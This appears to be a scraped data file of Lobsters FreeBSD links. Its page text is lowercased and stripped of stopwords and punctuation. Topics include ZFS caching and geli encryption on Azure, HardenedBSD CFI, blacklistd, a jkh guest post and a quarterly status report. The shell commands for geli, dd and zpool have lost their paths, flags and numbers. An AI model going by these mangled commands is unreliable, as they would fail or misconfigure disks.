shut vm azure portal resize unlikely event host server crash content temporary disk lost forever situation vm go back online zpool still reference offline disk thus cache disabled however system continue function normally administrator remove old cache disk command similar zpool remove tank id disk repeat command enable remember also always possible use premium storage disk recommended get iop want persistent volumesslogthe purpose slog make synchronous write call faster first caching highperformance ssd drive committing data final storage slog essentially separate storage zil zfs intent log otherwise kept disk dataunlike slog must put temporary local disk system crash might cause loss data persistent ssdbased storage premium storage used instead guarantee data integrityyou use one disk slog zfs stripe across although one disk enough example adding two disk azure vm use slog double iop attaching disk using azure portal make sure select premium storage ssd disk disable host cachingwhen disk attached attach log device tank zpool zpool add tank log result checked usual way zpool list v name size alloc free expandsz frag cap dedup health altroot tank online log cache tip azure necessary mirror content slog data already replicated three time azure storage backendencryptionone nicest feature zfs oracle solaris support builtin encryption sadly however added oracle closed source zfs openzfs implementation freebsd us support encryption box lot interest around feature community hard work implementing however far easy task encryption likely appear soon time zfs user freebsd linux macos etc need encrypt underlying disk create zfs filesystem topin example using azure vm two data disk turning encryption need generate new key example using keyfile stored o disk unencrypted production environment might acceptable may want leverage service azure key vault store key instead execute following command generate new key save make backup copy openssl rand chmod tip virtual machine support aesni extension leverage hardwareaccelerated encryption loading proper kernel module azure vms running intel cpu support aesni aseries vms may sometimes run amd chip hardware acceleration encryption using aseries vms check cpu model manufacturer made intel stop sysctl hwmodel example hwmodel intel r xeon r cpu cpu support aesni instruction kldload aesni echo aesniload yes bootloaderconf ready encrypt disk load geli kernel module kldload geomeli echo geomeliload yes bootloaderconf initialize encrypted geli disk using key aesxts use key without passphrase encrypt geli init l e aesxts k p geli init l e aesxts k p geli initialized ensure backup copy file attach provider ie disk using keyfile create devda eli geli attach k p geli attach k p write data encrypted device necessary zpool creation fail dd ifdevrandom dd ifdevrandom ensure partition decrypted automatically boot adding following line etcrcconf gelidevices k p k p finally create zpool named tank new encrypted volume enable zfs start boot echo zfsenable yes etcrcconf service zfs start create zpool encrypted disk zpool create tank check result zpool list v name size alloc free expandsz frag cap dedup health altroot tank online zpool ready accept new zfs datasets like example previous section
482,Lobsters,freebsd,FreeBSD,FreeBSD on Google Cloud Platform,https://googlecloudplatform.uservoice.com/forums/302595-compute-engine/suggestions/18618931-freebsd,freebsd google cloud platform,,made change increase security reset password sent email click link create password come back sign continue
484,Lobsters,freebsd,FreeBSD,FreeNAS Corral GA- State of the Union #5,https://youtu.be/x4IBKUmC5ns?t=4m48s,freenas corral ga state union,press copyright contact u creator advertise developer term privacy policy safety youtube work test new feature,press copyright contact u creator advertise developer term privacy policy safety youtube work test new feature
485,Lobsters,freebsd,FreeBSD,Call for Proposals | EuroBSDcon 2017,https://2017.eurobsdcon.org/2017/03/13/call-for-proposals/,call proposal eurobsdcon,call proposal eurobsdcon paris â france call talk presentation proposal cfp call tutorial proposal submission,call proposal eurobsdcon paris â france eurobsdcon european technical conference user developer bsdbased system conference take place paris franceâ tutorial held thursday friday enlisted participant andâ talk presented conference attendeesâ saturday sunday call talk presentation proposal periodâ close april call talk presentation proposal cfp theâ eurobsdcon program committeeâ inviting bsd developer user toâ submit innovative original talk proposal previously presented european conference topic interest conference include limited application architecture implementation performance security bsdbased operating system well topic concerning economic organizational aspect bsd use presentation expected minute delivered english call tutorial proposal theâ eurobsdcon program committeeâ also inviting qualifiedâ practitioner field submit proposal half full dayâ tutorial topic relevant development implementation use ofâ bsdbased system halfday tutorial expected hour fulldayâ tutorial hour tutorial talk held english submission proposal sent email toâ submission eurobsdconorg theyâ contain short concise text description wordsâ submission also include short cv speaker anâ estimate expected travel expense please submit proposal asâ separate email
487,Lobsters,freebsd,FreeBSD,Nintendo Switch runs FreeBSD,http://www.osnews.com/story/29698/Nintendo_Switch_runs_FreeBSD,nintendo switch run freebsd,nintendo switch run freebsd running freebsd author thomholwerda,nintendo switch run freebsd interesting little tidbit weekend know operating system nintendo switch running since basically nvidia shield kind expected running android heavily modded course turn running something else entirely running freebsd like sony nintendo also opts freebsd game console mean four major gaming platform two run window two run freebsd fascinating author follow twitter thomholwerda
488,Lobsters,freebsd,FreeBSD,Introducing CFI,https://hardenedbsd.org/article/shawn-webb/2017-03-02/introducing-cfi,introducing cfi,control flow integrity,control flow integrity cfi exploit mitigation technique help prevent attacker modifying behavior program jumping undefined arbitrary memory location microsoft implemented variant cfi term control flow guard cfg pax team spent last year perfecting reuse attack protector rap cfi cfg rap attempt accomplish goal rap complete effective implementation clang cfi stronger microsoft cfg pax team rap stronger cfi cfg rap would great addition hardenedbsd however requires toolchain patentpending hardenedbsd excited announce integration clang cfi base cfi enabled default hardenedbsd disabled setting withoutcfi srcconf cfi applicable architecture though shawn working porting safestack clang cfi requires linker support linktime optimization lto march version lld linker llvm project imported freebsd hardenedbsd lld first version lld usable base provides hardenedbsd linker support lto working hard past month developing testing integration clang cfi hardenedbsd base cfi scheme enabled base hardenedbsd exception cfiicall scheme handful application possible may need disable cfiicall scheme application need rely user base identify edge case application call function pointer resolved via dlopendlsym require cfiicall scheme disabled time applied cfi shared library aka crossdso cfi working crossdso cfi support base though core modification need made upon initial investigation need make llvmar llvmnm default ar nm need build libclangrtcfi static library gain support able enable cfiicall across board safestack crossdso cfi requires aslr wx order effective attacker know memory layout application attacker might able craft dataonly attack modifying cfi control data writing following application cfiicall disabled usrbinless usrbinmail usrbintop usrbintsort usrbinvi usrsbinbhyveload usrsbinpwdmkdb usrsbinsendmail usrsbinservices
489,Lobsters,freebsd,FreeBSD,February 2017 Projects Update - Blacklistd Porting Project Completion,https://www.freebsdfoundation.org/blog/february-2017-projects-update/,february project update blacklistd porting project completion,http peoplefreebsdorglidlblacklistdhtml,blacklistd porting project completion internetconnected server regularly face bruteforce attack service provide ssh authenticated smtp like limit number bruteforce attempt may made prevent unwarranted access resource limit impact noisy log file number existing tool mitigate brute force attack including sshguard operate monitoring log file entry corresponding failed access attempt automatically installing firewall rule temporarily disallow access source tool functional somewhat fragile require ongoing maintenance track change log message format netbsd christos zoulas developed blacklistd daemon take different approach consists blacklistd daemon minor modification daemon accept external connection like sshd modified daemon connect blacklistd upon connection attempt notify tuple action port protocol address owner blacklistd automatically installs remove firewall rule based notification configuration foundation awarded kurt lidl grant port blacklistd freebsd integrate set base system port daemon project complete blacklistd available freebsd freebsdcurrent development branch uptodate version blacklistd included freebsd although bug remain resolved release fixed branch fixed upcoming release kurt information configuring blacklistd replacement binary addressing known bug freebsd http peoplefreebsdorglidlblacklistdhtml enable blacklistd add etcrcconf blacklistdenable yes blacklistdflags r blacklistd us configuration file etcblacklistdconf control behavior default blacklistd configuration may look like blacklist rule adrmask port type proto owner name nfail disable local ssh stream ftp stream smtp stream submission stream specifies ssh ftp smtp mail submission port firewall source address hour failed attempt blacklistdusing service install firewall rule second individual daemon may need configured communicate blacklistd daemon sshd kurt added useblacklist configuration option order enable blacklistd sshd add following etcsshsshdconfig useblacklist yes blacklistd includes companion blacklistdctl utility used examine current state blacklist database blacklistd work pf ipfw firewall using presence special configuration file order enable ipfw configure starting rule number echo etcipfwblacklistrc part porting effort kurt implemented several bug fix improvement blacklistd committed upstream netbsd repository include change make source code portable support firewall available freebsd ipfw pf ipfilter addition netbsd npf improved logging contributed ed maste
490,Lobsters,freebsd,FreeBSD,"“Hi, I’m jkh and I’m a d**k”",https://blather.michaelwlucas.com/archives/2873,hi jkh k,recent talk benno,guest post blog private soapbox want scream void go get soapbox yesterday privy private email message discussing topic care deeply contacted author said really need make public give wider audience response boiled wanted get wider audience welcome first ever guest post jordan k hubbard one founder freebsd project discussion focus freebsd applicable large open source project email discussion freebsd project recently giving someone boot linking dig controversy elsewhere first install freebsd version late started reading freebsd mailing list shortly afterwards allow provide context say jkh say dick yes like good member press give anchor commentary footage soapbox interesting thread well interesting probably controversial recent talk benno much topic known long overly verbose phd thesis style posting try make one short er pithy point freebsd project energetic motivated capable people also viewed long lens history total dick least electronic form seem help coming way one person passionate concern topic x another person totally overthetop behavior concerning topic x neither side usually benefit information form conclusion two project need driven individual capable achieving productivity software industry term mine driving various agenda inspiring others progress allowing important opportunity project growth seized rather squandered need nice cooperative teamplayers go way avoid stepping toe driving junior perhaps easily intimidated volunteer away project would also awesome find attribute people obviously goal usually aspirational one immediately ever achieved reconcile two seemingly fundamentally opposed goal project membership management core going first let honest speak perspective someone committed many sin paragraph said many thing subsequently regretted engaged furious pitched battle topic subsequently proved almost nonsensically trivial definitely alienated people fact asperger syndrome also made easy highly driven insensitive people feeling time help even notice certainly excuse also learned along way grasp intellectually always grasp instinctively dick take deep breath swallow irritation often first response try figure another way expressing lead better longterm outcome le friction colleague boss endusers work heck still work progress definitely better year ago pretty much reason better people took time talk dick sent oh many private email saying effect dude really called phone clear really needed healthy dose perspective email job fellow developer colleague yes occasionally hr department collectively conspired slap across face trout truth clear going gone rail interpersonal communication decision making skill concerned short learned hard lesson responsible action number level glad managed stick around long enough learn said work progress come say core come addressing problem like time core get involved already late damage done probably irrevocably done long period time people complained complained finally core wearily stepped pulled trigger bang late anything else want better outcome simply need start mentoring one another need take extra time call fellow developer phone skype whatsapp whatever work clear one bad day escalating situation warrant escalation simply dick need probably even realize kind close frequent communication lot early day project absolutely know held thing together rather tempestuous time also excuse say project bigger outgrown either take one person call one person right time adhoc mentorship work wait see someone next conference clear struggling interact successfully others hereandnow reach many reached please also take word say truly successful freebsd project continue need driven people people often tempted drive right others get way otherwise tend show le perfect patience continue need quieter folk content follow someone else vision assuming one follow instinctively better job getting along others type benefit learn example provides assuming real commitment leave analogy like marriage couple passive probably longlived rather boring relationship ultimately wind counting day death come fiery impetuous relationship probably exciting equally shortlived successful marriage usually combination two extreme worst impulse one kept reasonably check get experience new exciting thing thought assuming also commit communicating frequent basis assume everything fine work kind marriage folk want jordan absolutely right open source community incredibly smart people folk brilliant jordan say work progress though applicable every one u including say open source community full people problem like add aspergers say adult know happen condition met every single one open source community strongly suspect gravitate computer comparatively easy compared people group issue writer know run really heavy depression social anxiety writer techie thanks writing career amazon prime free twoday shipping almost never leave house best brilliance great admire really really smart people belong community person must able work community using must rfc sense absolute nonnegotiable requirement bsd open source general full brilliant incomplete people everyone incomplete open source incompleteness often social skill understanding behave social correction establishment social norm come community entirely bottomup one one go counselor help develop skill best advice come peer exact situation faced problem developed skill good communicating open source community another contributor like social problem unofficially mentor open source contributor keep getting message people saying something like dude really messed really inappropriate stop similar one message might big deal keep getting sign missing skill skill learned someone get along offer help listen far better done via voice electronic text text communication strip vital context much much slower voice person problem communicating via email email going solve one hardest thing listen someone call dick yes happened come people respect listen make le incomplete jordan learn dick anyone naming person got booted freebsd like everyone else incomplete person lack particular skill hope develop skill want blog post hurt chance getting job even opportunity add skill power make brilliant poorly socialized contributor better community member even brilliant member stalk social medium
491,Lobsters,freebsd,FreeBSD,"FreeBSD Quarterly Status Report October, 2016 - December, 2016",https://www.freebsd.org/news/status/report-2016-10-2016-12.html,freebsd quarterly status report october december,introduction freebsdorg portmgrsecretary freebsdorg portmgr freebsdorg open task core freebsdorg security deb freebsdfoundationorg http wwwfreebsdfoundationorgdonate http cifreebsdorg http wwwfreebsdfoundationorgjournal http wwwfreebsdfoundationorgnewsandeventsnewsletter http http wwwfreebsdfoundationorg wjw digiwarenl http open task brueffer freebsdorg rwatson freebsdorg trustedbsdaudit trustedbsdorg news open task todo ed freebsdorg open task freebsdorg mmacy nextbsdorg sepherosa gmailcom honzhan microsoftcom decui microsoftcom kyliel microsoftcom http gonzo freebsdorg ganbold freebsdorg andrew freebsdorg gonzo freebsdorg cperciva freebsdorg open task kientzle freebsdorg mm freebsdorg open task bapt freebsdorg emaste freebsdorg open task jhb freebsdorg lucapizzamiglio gmailcom open task rafaelespindola gmailcom emaste freebsdorg open task gerald freebsdorg andreast freebsdorg antoine freebsdorg http open task olivierd freebsdorg jesper schmitzcomputer open task mono freebsdorg open task gerald freebsdorg dbn freebsdorg open task xfce freebsdorg open task news home status home,introductionanother year passed another gotten well underway worked assemble report past two year part monthly team assembles report enlightening watch individual entry pas emacs andor vim report give picture going freebsd could get reading commit mail hope also true readersthis quarter brings usual mix continuation many stalwart project entire new participant well return item quarter hiatus enjoy enlightened kadukthe deadline submission covering period january march april contact freebsd release engineering team freebsdorg freebsd release engineering team responsible setting publishing release schedule official project release freebsd announcing code freeze maintaining respective branch among thing freebsd release engineering team concert freebsd security team finalized freebsd freebsd announced october roughly four week original schedule freebsd release engineering team would like specifically thank colin percival member freebsd security team extra diligence ensuring userfacing upgrade path properly addressed documented project sponsored freebsd foundation contact rené ladan portmgrsecretary freebsdorg contact freebsd port management team portmgr freebsdorg port tree reached marker port pr count risen slightly around pr unassigned last quarter saw commits committers number open number unassigned pr increased lightly since last quarter two commit bit taken safe keeping last quarter jmg month inactivity edwin request welcomed three new committers nikolai lifanov lifanov jason bacon mikhail pchelin misha management side adamw feld elected new portmgr member rene promoted full member feld already involved portssecteam infrastructure side two new us lxqt varnish introduced default version also updated varnish new gcc perl python two major port reached endoflife december removed perl linux fedora default linux centos freebsd also reached endoflife support version removed port tree major port updated latest version pkg firefox firefoxesr chromium ruby wwwnode updated version version split longterm support behind scene antoine ran expruns verify package update framework change change base system bdrewery installed new package builder added build freebsd mips also improved balancing monitoring automation package builder open task spare time please take pr testing committing contact freebsd core team core freebsdorg major concern core last quarter maintaining effectiveness secteam team primarily need better project management improve communication generally allow team member concentrate technical aspect handling vulnerability end agreement principle either freebsd foundation one company major freebsd user employ someone specifically role core confirmed new support model would go effect despite postponement switch packaged base release mechanism detail new support model please follow link security page freebsd website core requested removal miscjive port ground function turn text offensively racist parody proved controversial many seeing first step bowdlerizing entire port tree certainly core intention core aim help secure future freebsd project making welcoming contributor regardless ethnicity gender sexuality improper base discrimintation miscjive may seen harmless fun today implicit approval implied port tree sends message odds project aim marketing team associated marketing freebsdorg mailing list wound due lack activity message marketing freebsdorg forwarded freebsd foundation marketing team instead core member allan jude already clusteradm liason became full member clusteradm emergency correction release note authorised giving misleading impression wireless support added misapprehension repeated press reality freebsd support many year announcement said support added many additional device driver discussion proposal improve unicode support ongoing freebsd already standard conformant propsal switch implementation similar linux glibc currently us opinion divided technical merit new approach usual quota query licensing legal matter plan create overlay base system shelved light faster expected progress enabling building world using external toolchain trademark page website updated show current owner number trademark approved form absence tool extract summarize relevant information obligation bsd license redistribution binary form must reproduce copyright notice list condition following disclaimer documentation andor material provided distribution fulfilled providing tarball system source embedded copyright statement european court justice right forgotten applies search engine freebsd project one need take action core following closely discussion within llvm project regarding change license implemented might require audit entire port tree discover package contain binary linked libc ensure licensed compatibly llvm however indication llvm project adopt change open source exception firmware license mean committing binary blob driver nvidia jetson xhci device acceptable quarter four new commit bit awarded please welcome dexuan cui david bright konrad witaszczyk piotr stefaniak sorry see edwin lansing hang commit bit step portmgr contact deb goodkin deb freebsdfoundationorg freebsd foundation c nonprofit organization dedicated supporting promoting freebsd project community worldwide funding come individual corporate donation used fund manage software development project conference developer summit provide travel grant freebsd contributor foundation purchase support hardware improve maintain freebsd infrastructure publishes marketing material promote educate advocate freebsd project facilitates collaboration commercial vendor freebsd developer finally represents freebsd project executing contract license agreement legal arrangement require recognized legal entity highlight help freebsd last quarter fundraising effort work funded donation raised donor thank everyone made donation help u continue effort support freebsd project community worldwide make donation fundraising campaign http wwwfreebsdfoundationorgdonate o improvement foundation improves freebsd operating system employing technical staff maintain improve critical kernel subsystem add feature functionality fix problem also includes funding separate project grant like port blacklistd access control daemon integration vimage support make sure freebsd remains viable solution research education computing product large project supported last year include port vimage integration toolchain work blacklistd access control daemon foundation team worked technology roadmap board meeting november staff board member continued hosting biweekly conference call facilitate effort individual collaborate different technology find support provided reading individual update ed maste konstatin belousov edward napierala report release engineering foundation provides fulltime staff member lead release engineering effort provided timely reliable release last year last quarter fulltime staff member worked freebsd release engineering security team finalize also added support powerpcspe architecture snapshot build continued work packaging base system pkg also continued producing development snapshot build throughout quarter find support provided release engineering team reading status update report supporting freebsd infrastructure foundation provides hardware support improve freebsd infrastructure year purchased following hardware improve build continuous integration platform process server reduce build time hour minute continuous integration process find information http cifreebsdorg two thunderx server native package build architecture two server improve release engineering build four server improve package build four server build slave increase number build continuous integration process freebsd advocacy education large part effort dedicated advocating project includes promoting work done others freebsd producing advocacy literature teach people freebsd help make path starting using freebsd contributing project easier attending getting freebsd contributor volunteer run freebsd event staff freebsd table give freebsd presentation list highlighting advocacy education work last year attended andor sponsored event around world provided travel grant developer created new updated marketing literature including updated freebsd brochure new teachbsd postcard spread word program google summer code flyer freebsd brochure updated recruiting flyer updated get involved flyer freebsd platform research flyer created series freebsd howto guide installing freebsd virtualbox macwindows installing desktop environment freebsd installing freebsd raspberry pi installing pcbsd primary operating system freebsd setup tip acquired new testimonial acceleration system neosmart technology chelsio communication crescent river port pilot association ixc stormshield updated freebsd project foundation branding new freebsd foundation website logo updated brand asset page include information freebsd project freebsd foundation logo published septemberoctober novemberdecember journal issue http wwwfreebsdfoundationorgjournal also published monthly newsletter highlight work done support freebsd tell upcoming event provide information keep loop support freebsd project community http wwwfreebsdfoundationorgnewsandeventsnewsletter conference event freebsd foundation sponsor many conference event summit around globe event bsdrelated open source technology event geared towards underrepresented group support freebsdfocused event help provide venue sharing knowledge work together project facilitate collaboration developer commercial user help provide healthy ecosystem support nonfreebsd event promote raise awareness freebsd increase use freebsd different application recruit contributor project also sponsored attended following event last quarter ohio linuxfest october columbus ohio grace hopper october houston tx cosc october beijing china bay area freebsd vendor devoloper summit meetbsd november berkely ca usenix lisa december boston osc december beijing china get whole list conference supported http legalfreebsd ip foundation owns freebsd trademark responsibility protect continued review request grant permission use trademark also provided legal support core team investigate status certain patent freebsd community engagement anne dickison marketing director overseeing effort rewrite project code conduct help make safe inclusive welcoming community updated code conduct report guideline going final review process handed core team approval go http wwwfreebsdfoundationorg find support freebsd help contact willem jan withagen wjw digiwarenl ceph distributed object store file system designed provide excellent performance reliability scalability object storage ceph provides seamless access object using native language binding radosgw rest interface compatible application written swift block storage ceph rados block device rbd provides access block device image striped replicated across entire storage cluster file system ceph provides posixcompliant network file system aim high performance large data storage maximum compatibility legacy application started looking ceph hast solution carp ggate really looking aim run ceph storage cluster storage node running zfs user station would running bhyve rbd disk stored ceph freebsd build ceph includes tool ceph provides note rbddependent item work since freebsd rbd yet notable progress since last report rbd actually buildable used manage rados block device test run completion current selection tool though neded minor patch yet pulled head cmake way building ceph threadingpolling code reworked simple socket code us selfpipe instead using odd shutdown signaling linux feature eventkqueue code modified work around feature starting thread destroys kqueue handle code finshed yet submitted main repository investigated difference freebsd linux soreuseaddr soreuseport fortunately code used testing disabling feature delay progress test jenkins instance regularly testing cephcephmaster wjwithagencephwipfreebsd regular verification buildability test http build prerequisite compiling building ceph tested clang probably also work given experience clang interestingly clang work well either clang present required capability compile everything following setup get thing running freebsd install bash link bin longer necessary add definition enodata usrincludeerrnoh clone github repo http githubcomwjwithagencephgit checkout wipfreebsd branch run dofreebsdsh start build old build method using automake longer used see readmefreebsd detail part yet included krbd kernel rados block device implemented linux kernel freebsd kernel perhaps ggated could used template since thing krbd disk also userspace counterpart could ease development bluestore freebsd linux different aio apis incompatibility need resolved somehow additionally discussion freebsd aiocancel working devicetypes cephfs cython try access internal field struct dirent compile test verify correct working also excluded testset open task run integration test see freebsd daemon work linux ceph platformcompile test user space rbd rados block device currently work testing limittedinvestigate see inkernel rbd device could developed akin freebsd ggateinvestigate keystore could embedded kernel linux currently prevents building cephfs component first question whether really required krbd require itscheduler information used moment scheduler work rather differently freebsd linux certain point time would need attention srccommonthreadccintegrate freebsd etcrcd initscripts ceph stack help testing also enables running ceph production machinesbuild testcluster start running teuthology integration test itdesign virtual disk implementation used bhyve attached rbd image contact christian brueffer brueffer freebsdorg contact robert watson rwatson freebsdorg contact trustedbsd audit mailing mist trustedbsdaudit trustedbsdorg openbsm bsdlicensed implementation sun basic security module bsm api file format userspace side capp audit implementation freebsd mac o x additionally audit trail processing tool expected work linux quarter saw increased development activity fueled darpa cadet project resulting release openbsm alpha among release change ability specify kernel maximum audit queue length sandboxing support auditreduce praudit freebsd system support capsicum well addition event identifier freebsd system call complete list change documented news file github new release merged freebsd head supported stable branch shortly project sponsored darpaafrl part open task test new release different version freebsd mac o x linux particular testing latest version mac o x would greatly appreciatedfix problem reported via github freebsd bug trackerimplement feature mentioned todo list github contact ed schouten ed freebsdorg prometheus open source monitoring system originally built soundcloud since project part cloud native computing foundation together project like kubernetes prometheus scrape target periodically sending http get request target respond sending keyvalue pair metric sample value prometheus query language promql used aggregate sample value specify alerting condition tool like grafana used create fancy dashboard using query prometheus project provides utility called nodeexporter gather basic system metric serf http utility tends rather complex extract metric many different source linux file proc uniform format meaning every kernel framework custom collector need written freebsd sitiuation better data exported sysctl already structured way easily translated prometheus metric format goal project thus provide generic exporter entire sysctl tree prevent unnecessary bloat indirection may also make life kernel developer lot easier one easily use prometheus graph occurrence event time temporarily adding counter kernel initial version sysctl exporter integrated freebsd base system december run inetd uncommenting example provided inetdconf unfortunately exporter merged back freebsd depends kbibreaking change sysctl open task using prometheus interested using sure give prometheus sysctl exporter try would nice created set useful alerting rule placed usrshareexamples example one use exporter monitor state geombased raid array information even exported sysctl prometheus us rather clever format exporting histogram histogram useful expressing amount time taken complete certain event example disk operation would possible add histogram native data type sysctl chance implemented without picking kernel lock contact freebsd graphic team freebsdorg contact matthew macy mmacy nextbsdorg good progress graphic support made week around christmas new year import linux drm amdgpu drmnext branch github repository amdgpu km driver already somewhat usable major known issue remaining support gpus far back southern island polaris update also appears fixed regression introduced merge late past summer drmnext branch support intel integrated graphic unit kaby lake cpu facilitate outofthebox support current branchlocal vm change reverted graphic fault routine converted use pgpopulate new interface source couple regression causing panic severe artifact amdgpu integrated gpus mark johnston markj volunteered analyze issue please show support encouragement mark helping move project towards finish line xservermesanextudev branch created port development repository hold mesa fix newer amd gpus us fork libudevdevd shim also bringing mesa closer linux upstream plan keep updating drm amdgpu use desktop potentially longer term gpgpu computation well work mark address existing bug assuming two new porter approved however linux developer seem aggressively explore space possible implementation use linux internal apis making prohibitively time consuming track upstream helping someone learn rope replay subset change linux release freebsd hope take mantle drmnext maintainer assuming issue listed addressed port linuxkpi drm km driver use standard current installation planned together upgrade relevant graphic port provide experimental support new amd intel gpus contact sepherosa ziehau sepherosa gmailcom contact hongjiang zhang honzhan microsoftcom contact dexuan cui decui microsoftcom contact kylie liang kyliel microsoftcom project provides native virtualized interface freebsd system running hyperv virtualization improving performance traditional emulated evices perring polling multipacket rndis message system r integration implemented optimizing throughput latency hyperv network driver live virtual machine backup implemented ufs v volume shadow copy service depends implemented pcie passthrough implemented patch implement nic sriov reviewed phabricator vdso support speeding gettimeofday implemented freebsd image azure http available addition existing image fixed issue scsi disk would sometimes fail attach resolving bug hyperv fail attach scsi disk lun project sponsored microsoft contact oleksandr tymoshenko gonzo freebsdorg minnowboard atombased board intel series soc makerfriendly formfactor provides convenient access pin used connect peripheral using one standard bus gpio spi bus common armmips world freebsd able boot fine lacked support bus minnowboard head support three bus via bytgpio intelspi driver bytgpio change backported intelspi mfced couple week contact ganbold tsagaankhuu ganbold freebsdorg change necessary support allwinner consumer ir interface freebsd committed receive rx side supported driver using evdev framework tested soc using lirc dfrobot simple ir remote controller contact andrew turner andrew freebsdorg contact oleksandr tymoshenko gonzo freebsdorg support accessing floatingpoint register kernel added us kpi allow handling place floatingpoint state may modified example calling uefi support optional aes instruction added kernel make use ability store restore floating point state test shown significant improvement aes performance thunderx hardware cortex string memcpy memmove function imported kernel optimised implementation common function freebsd boot softiron overdrive using acpi needed change submitted phabricator review includes booting smp enabled currently supported device support raspberry pi committed device work exception wifi bluetooth attached via asyet unsupported sdio bus project sponsored freebsd foundation abt system ltd contact colin percival cperciva freebsdorg report cover work since last status report part regular freebsd release build snapshot release automatically uploaded copied available region due legal restriction currently include govcloud china beijing region anyone wishing use freebsd region encouraged contact author aws marketplace report approximately user running roughly freebsd instance count likely significantly larger number instance launched directly api console least place lower bound usage freebsd shipped support enhanced networking capability excluding instance provides significantly higher network performance virtual networking available older instance older version freebsd freebsd later also use indirect segment disk io yield approximately higher throughput equal lower latency support instance type freebsd support amazon simple system manager service run command open task complete pending reorganization account used releasessupport second generation enhanced networking via new elastic network adapter found instancesprovide tool improved functionality via simple system manager service listing installed package checking update addingremoving user favourite sysadmin task go add support networking default configurationcontinue ongoing interoperability testing freebsd nfs client amazon elastic file system nfsasaservice contact tim kientzle kientzle freebsdorg contact martin matuska mm freebsdorg libarchive bsdlicensed archive compression library originally developed part freebsd support wide variety input output format also includes three commandline tool bsdcat bsdcpio bsdtar freebsd tar cpio utility taken directly libarchive many important utility like ar unzip pkg package manager make use libarchive function libarchive development focusing bug fix code cleanup including fixing several critical security issue automated testing travis ci jenkins introduced libarchive added google ossfuzz project fuzzing helped detect several hidden problem like buffer overflow memory leak last month acl support pax restricted pax default bsdtar format completed merged freebsdcurrent acl entry stored restored tar archive open task extensive ci testing freebsd different platform release currently get tested via automated jenkins jobas every commit libarchive may influence build process freebsd port ability trigger semi automated exprun port tree would great contact baptiste daroussin bapt freebsdorg contact ed maste emaste freebsdorg reproducible build set software development practice create verifiable path human readable source code binary code used computer build reproducible given source code build environment build instruction party recreate bitforbit identical copy specified artifact baptiste daroussin ed maste attended second reproducible build summit last december berin discussed issue common interest operating system provider including bsds linux distribution following summit change committed freebsd base system address outstanding source nonreproducibility possible build freebsd base system kernel userland completely reproducibly although currently requires nondefault setting approximately port tree build reproducibly workinprogress patch base system built reproducibly focus move port tree project sponsored freebsd foundation linux foundationopen task integrate freebsd port build reprodciblebuildsorg continuous integration infrastructureintegrate reproducible build patch port treeinvestigate source nonreproducibility individual port contact john baldwin jhb freebsdorg contact luca pizzamiglio lucapizzamiglio gmailcom develgdb port updated gdb includes additional fix related tracing vfork fix depend change ptrace kernel report new ptrace stop parent vfork resume support freebsdmips userland binary committed upstream patch along support debugging freebsdmips kernel added port soon open task figure powerpc kgdb target able unwind stack past initial frameadd support platform arm upstream gdb userland kgdbadd support debugging powerpc vector registersadd support siginfoimplement info proc commandsimplement info o commandsdebug gdb hang related kill command contact rafael espíndola rafaelespindola gmailcom contact ed maste emaste freebsdorg lld linker llvm family project highperformance linker support elf coff macho object format aim compatible common linkers used file format elf gnu binary file descriptor bfd ld gnu gold however lld author constrained strict compatibility would hamper performance desired functionality lld developer made significant progress last quarter change committed lld freebsd reached major milestone possible link entire base system kernel userland lld base system link lld started investigating linking application port tree lld process identifying limitation bug lld number freebsd port workinprogress patch link approximately port collection lld project sponsored freebsd foundationopen task fix libtool detect lld pas command line argument gnu ld goldinvestigate remaining port build failuresinvestigate improve lld arm architecturesextensive testing contact gerald pfeifer gerald freebsdorg contact andreas tobler andreast freebsdorg contact antoine brodin antoine freebsdorg long awaited update gcc default version gcc port collection langgcc port usegccyes makefiles arrived update gcc brings quite number improvement see http detail moved gcc release mark closure gcc branch release series yes mean rather get next version upgrade langgcc place soon update per se straightforward help addressing fallout broken port would great please let u know want help updated first gcc gcc bringing fair number fix suitable production use open task update langgcc hence usegccyes gcc contact olivier duchateau olivierd freebsdorg contact jesper schmitz mouridsen jesper schmitzcomputer lxqt qt port upcoming version lxde lightweight desktop environment product merge lxdeqt razorqt project porting effort remains much work progress lxqt requires component plasma new major kde workspace imported core component necessary update devellxqtbuildtools develliblxqt develqtxdg standalone application graphicslximageqt also update open task improve support sysutilslxqtadmin especially date time setting contact mono freebsd team mono freebsdorg last quarter many port within mono project updated mono monodevelop fsharp usesmono extended allow easier use nuget package extension used adopted fsharp monodevelop openra work started porting microsoft opensourced net core thanks work another team native component coreclr corefx already support freebsd however work required bootstrapping build process compiling managed code open task port net coretest patch mono contact gerald pfeifer gerald freebsdorg contact david naylor dbn freebsdorg stable version wine aka emulatorswine seen three maintenance release last half year xinerama support case one screen gnutls helpful evernote world warcraft example active default development version aka emulatorswinedevel seen steady progress reached rc phase wine looking forward new major release soon combine progress year active development stability release open task port contact freebsd xfce team xfce freebsdorg xfce free software desktop environment unix unixlike platform freebsd aim fast lightweight still visually appealing easy use quarter team kept application uptodate committed devel repository graphicsristretto committed devel repository committed devel repository committed devel repository committed devel repository committed devel repository committed devel repository committed devel repository also follow unstable release available experimental repository requires gtk open task apply change discussed simplify mastersites macro port makefiles commit stable panel pluginsnews home status home
492,Lobsters,freebsd,FreeBSD,bsdtalk266 - The nodes take over,http://bsdtalk.blogspot.com/2017/02/bsdtalk266-nodes-take-over.html,node take,,became tired waiting file info ogg link http
493,Lobsters,freebsd,FreeBSD,Convincing a Linux guy to use FreeBSD,https://www.youtube.com/watch?v=cofKxtIO3Is,convincing linux guy use freebsd,press copyright contact u creator advertise developer term privacy policy safety youtube work test new feature convincing linux guy use freebsd lunduke hour feb youtube,press copyright contact u creator advertise developer term privacy policy safety youtube work test new feature convincing linux guy use freebsd lunduke hour feb youtube
